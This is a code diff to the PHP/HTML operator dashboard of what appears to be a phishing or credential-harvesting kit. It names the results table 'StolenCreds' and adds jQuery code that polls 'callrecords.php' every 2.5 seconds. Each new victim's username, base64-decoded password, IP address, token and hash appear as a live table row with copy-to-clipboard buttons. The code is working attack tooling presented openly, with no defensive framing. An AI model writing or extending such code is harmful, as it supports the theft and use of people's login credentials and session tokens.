@@ -29,6 +29,9 @@ table.blank td {
 
 }
 </style>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>  
+ 
 </HEAD>
 <script>
 function copyuser(id) {
@@ -154,10 +157,15 @@ $result = $conn->query($sql);
 </TABLE>
 
 <br>
+<form method="post" id="add_details">
+<input type="submit" name="add" id="add" class="btn btn-success" value="Add" />
+</form>
 
-
-<TABLE BORDER=1><TR><TH>Username</TH><TH>Password</TH><TH>Time</TH><TH>IP</TH><TH>Project</TH><TH>Token</TH><TH style="word-wrap: break-word;
+<TABLE id="StolenCreds" BORDER=1><TR><TH>Username</TH><TH>Password</TH><TH>Time</TH><TH>IP</TH><TH>Project</TH><TH>Token</TH><TH style="word-wrap: break-word;
 max-width: 150px;">Hash</TH><TH>Extra Field</TH><TH>Actions</TH></TR>
+<tbody id="table_data">
+
+
 <?php
 
 $i = 1;
@@ -176,7 +184,86 @@ printf($conn->error);
 }
 
 $conn->close();
-?></TABLE>
+?></tbody></TABLE>
+
+<script>
+
+
+
+
+function fetchdata(){
+	
+var table = document.getElementById('StolenCreds');
+lastseenval = table.rows[1].cells[2].innerHTML;
+uid = Math.floor(Math.random() * 1000000);
+	
+  $.ajax({
+   url:"callrecords.php",
+   method:"POST",
+   data: {project: '<?php echo $project; ?>', lastseen: lastseenval},
+   dataType:"json",
+   beforeSend:function(){
+    $('#add').attr('disabled', 'disabled');
+   },
+   success:function(data){
+    $('#add').attr('disabled', false);
+    if(data.username)
+    {
+     var html = '<tr>';
+     html += '<td style="text-align:right" id="user'+uid+'">'+data.username+'<button id="btn" onclick="copyuser(\'user'+uid+'\');"><img src="../images/clipboard-outline.svg" height="20px"/></button></td>';
+	 html += '<td style="text-align:right" id="pass'+uid+'">'+atob(data.password)+'<button id="btn" onclick="copyuser(\'pass'+uid+'\');"><img src="../images/clipboard-outline.svg" height="20px"/></button></td>';
+	 html += '<td>'+data.entered+'</td>';
+	 html += '<td>'+data.ip+'</td>';
+	 html += '<td><?php echo $project; ?></td>';
+	 html += '<td>'+data.Token+'</td>';
+	 if(data.Hash == null)
+	 { data.Hash = ''; }
+	 html += '<td>'+data.Hash+'</td>';
+     html += '<td>'+data.extra+'</td>';
+	 html += '<?php echo "<td><form method=\"post\" action=\"".$_SERVER['PHP_SELF']."\"><input type=\"submit\" value=\"Delete\" name=\"DELETE\">".$inputfields."</td></form></tr>"; ?>';
+     $('#table_data').prepend(html);
+     $('#add_details')[0].reset();
+    }
+   }
+});
+ 
+}
+
+$(document).ready(function(){
+ setInterval(fetchdata,2500);
+});
+</script>
+
+<!--<script>
+$(document).ready(function(){
+ 
+ $('#add_details').on('submit', function(event){
+  event.preventDefault();
+  $.ajax({
+   url:"callrecords.php",
+   method:"POST",
+   data: {project: 'Test'},
+   dataType:"json",
+   beforeSend:function(){
+    $('#add').attr('disabled', 'disabled');
+   },
+   success:function(data){
+    $('#add').attr('disabled', false);
+    if(data.username)
+    {
+     var html = '<tr>';
+     html += '<td>'+data.username+'</td>';
+     html += '<td>'+data.password+'</td></tr>';
+     $('#table_data').prepend(html);
+     $('#add_details')[0].reset();
+    }
+   }
+  })
+ });
+ 
+});
+</script>-->
+
 </CENTER>
 </BODY>
 </HTML>
